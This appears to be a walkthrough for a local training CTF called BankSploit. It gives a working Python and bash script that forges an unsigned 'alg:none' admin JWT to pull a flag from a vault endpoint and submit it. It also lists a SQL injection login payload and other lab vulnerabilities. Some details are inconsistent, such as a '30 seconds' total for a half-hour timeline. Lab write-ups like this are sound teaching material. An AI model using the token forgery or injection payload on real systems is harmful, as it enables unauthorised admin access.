# 🚩 BankSploit CTF: How to Get & Submit Flags

## Quick Answer: Where Flags Come From

**Flags are NOT visible on the dashboard.** They're generated on-demand from a **special API endpoint** that requires a forged JWT token with `role: "admin"`.

---

## 🎯 Step-by-Step: Getting Your First Flag

### Step 1: Forge an Admin JWT

```python
import json
import base64
import time

def forge_admin_jwt(customer_id="BS100001"):
    """Create a forged JWT with role=admin and alg=none"""
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "sub": customer_id,
        "role": "admin",  # THIS IS THE KEY!
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    
    def b64url_encode(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
    
    return b64url_encode(header) + "." + b64url_encode(payload) + "."

# Generate token
token = forge_admin_jwt("BS100001")
print(f"Forged Token: {token}")
```

### Step 2: Call the Vault Endpoint

The vault is **JWT-only** (not session-based). Send the forged token in the `Authorization` header:

```bash
curl -H "Authorization: Bearer <YOUR_TOKEN>" \
  http://localhost:9443/api/v1/auth/vault
```

**Expected Response**:
```json
{
  "ok": true,
  "message": "🔓 Vault unlocked! You forged a valid admin JWT.",
  "flag": "BANKSPLOIT{A8F3C21D9E0B}",
  "user": "BS100001"
}
```

### Step 3: Copy the Flag

Your flag is in the `flag` field. Format: **`BANKSPLOIT{12-char-hex}`**

---

## 📋 All Flags & Where They Come From

| Vulnerability | Flag ID | Points | How to Get It | Where |
|---|---|---|---|---|
| OTP in HTML | auth.l11 | 100 | Inspect page source | Browser DevTools |
| SQLi Login | auth.g1 | 200 | Use payload `BS100001' #` | `/api/v1/auth/vault` (after login via SQLi) |
| OTP Brute-force | auth.l10 | 200 | Guess 4-digit OTP | `/api/v1/training/submit-flag` |
| **JWT alg:none** | **auth.l12** | **300** | **Forge admin JWT** | **`/api/v1/auth/vault`** |
| IDOR Statements | statements.l1 | 200 | Change URL param | `/api/v1/training/submit-flag` |
| IDOR Transfer | transfer.l1 | 300 | Edit DOM/intercept | `/api/v1/training/submit-flag` |
| SQLi Extraction | statements.g2 | 300 | UNION-based SQLi | `/api/v1/training/submit-flag` |
| Command Injection | statements.g9 | 300 | Shell metacharacters | `/api/v1/training/submit-flag` |

---

## 🚀 Submit Your Flag

### **Method 1: Training Lab (Main Submission)**

1. Go to: **http://localhost:9443/training**
2. Find **JWT alg:none (auth.l12)** in the vulnerability list
3. Paste your flag in the submission box
4. Click **Submit**

**Result**:
```
✅ Correct! AUTH.L12 — JWT Algorithm Vulnerability — +300 pts
```

Points appear on your **Leaderboard** profile.

### **Method 2: API Direct Submission**

```bash
curl -X POST http://localhost:9443/api/v1/training/submit-flag \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=<your_session>" \
  -d '{"flag": "BANKSPLOIT{A8F3C21D9E0B}"}'
```

**Response**:
```json
{
  "ok": true,
  "correct": true,
  "message": "🚩 Correct! L12 — JWT Algorithm Vulnerability — +300 pts",
  "vuln_id": "auth.l12",
  "points": 300,
  "stats": {"total": 8, "found": 3, "exploited": 2, "reviewed": 0, "score": 25}
}
```

---

## 🏆 View Your Progress

### **On the Dashboard**

After logging in, go to:
- **http://localhost:9443/dashboard** - See your account
- **http://localhost:9443/leaderboard** - See all participants ranked by points

**Your Stats**:
- Rank (by total points)
- Flags Captured
- Total Points Earned
- Last Capture Time

### **In Training Lab**

http://localhost:9443/training

Shows:
- Progress radar (% exploited per category)
- All vulnerabilities with submission box
- Hints (if stuck)

---

## 📌 Flag Validation Rules

Flags are **per-user & per-vulnerability**:

```
Flag = HMAC-SHA256(user_id:vulnerability_key, server_secret)
```

This means:
- ✅ Same flag always validates for the same user+vuln
- ❌ Cannot be shared between users (different user = different flag)
- ❌ Cannot be forged without server secret
- ✅ Deterministic (never changes for that user+vuln combo)

**Example**: User BS100001's auth.l12 flag is always `BANKSPLOIT{A8F3C21D9E0B}` (at all times).

---

## ⚡ Complete Exploit: From Zero to Flag

```bash
#!/bin/bash

# 1. Generate forged admin JWT
TOKEN=$(python3 -c "
import json, base64, time
h = base64.urlsafe_b64encode(b'{\"typ\":\"JWT\",\"alg\":\"none\"}').rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'BS100001','role':'admin','exp':int(time.time())+3600}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
")

echo "[*] Forged JWT: $TOKEN"

# 2. Call vault with Bearer auth
RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:9443/api/v1/auth/vault)

echo "[*] Vault Response:"
echo "$RESPONSE" | jq .

# 3. Extract flag
FLAG=$(echo "$RESPONSE" | jq -r '.flag')
echo "[*] Extracted Flag: $FLAG"

# 4. Submit flag via training lab API
RESULT=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -b "PHPSESSID=$(curl -s http://localhost:9443/login -c - | grep PHPSESSID | awk '{print $7}')" \
  -d "{\"flag\":\"$FLAG\"}" \
  http://localhost:9443/api/v1/training/submit-flag)

echo "[*] Submission Result:"
echo "$RESULT" | jq .
```

---

## 🔍 Debugging: Flag Not Working?

### **Flag Format Wrong**
```
❌ BANKSPLOIT{a8f3c21d9e0b}  <- lowercase
❌ BANKSPLOIT_A8F3C21D9E0B   <- wrong separator
✅ BANKSPLOIT{A8F3C21D9E0B}  <- correct
```

### **Wrong User**
The flag is tied to YOUR user ID. You cannot use someone else's flag.

### **Check Your User ID**
```sql
SELECT id, customer_id, name FROM users WHERE customer_id = 'BS100001';
```

### **Regenerate Flag**
For the same user+vuln:
```python
from src.core.Flags import Flags
flag = Flags.generate('auth.l12', 123)  # user_id=123
print(flag)
```

---

## 🎓 Why This Design?

1. **Per-user flags** - Prevent flag sharing on forums/Discord
2. **HMAC-based** - Cannot be forged without server secret
3. **Deterministic** - Same exploit = same flag (no luck)
4. **Vault endpoint** - Forces you to actually forge a JWT (not just login normally)

---

## 📊 Example: Full Challenge Flow

```
Time 0:00 - Read JWT vulnerability explanation
Time 0:05 - Write forging script (Python)
Time 0:10 - Test local JWT forging (works!)
Time 0:15 - Generate forged admin JWT with role=admin
Time 0:20 - Call /api/v1/auth/vault with Bearer token
Time 0:25 - Get flag: BANKSPLOIT{A8F3C21D9E0B}
Time 0:30 - Submit at /training (Training Lab form)
Time 0:31 - ✅ CORRECT! +300 points
Time 0:32 - Leaderboard updated
```

**Total time**: ~30 seconds ⚡

---

## 🎯 Next Steps

1. ✅ Run the forging script above
2. ✅ Call `/api/v1/auth/vault` with Bearer token
3. ✅ Verify you get the flag
4. ✅ Submit at http://localhost:9443/training
5. ✅ Check leaderboard: http://localhost:9443/leaderboard

**Good luck! 🚩**

---

**Generated**: 2026-08-08  
**Platform**: BankSploit CTF  
**Status**: Ready for submission
